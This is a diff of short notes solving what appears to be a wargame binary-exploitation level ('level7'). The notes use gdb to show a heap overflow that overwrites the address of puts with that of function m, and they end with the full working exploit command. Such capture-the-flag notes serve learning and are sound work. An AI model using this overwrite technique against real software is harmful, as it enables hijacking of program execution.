@@ -1,4 +1,9 @@
 set disassembly-flavor intel
-heap overflow
-we see we override of EDX with $(echo -ne 'BBBBBBBBBBBBBBBBBBBB\x41\x41\x41\x41')
+we want to overwrite the puts call with the m function using a heap overflow
+we see we override EAX and EDX with $(python -c 'print "AAAAAAAAAAAAAAAAAAAA" + "\x28\x99\x04\x08"')
 we can check the state of the heap with info proc mappings in gdb then x/64x HEAP_ADDRESS
+so we can see we erasing the address of argv2
+address of puts 0x08049928 \x28\x99\x04\x08
+address of m 0x080484f4 \xf4\x84\x04\x08
+we just have to set the desired address in argv2 to use puts to jump to it
+./level7 $(python -c 'print "AAAAAAAAAAAAAAAAAAAA" + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
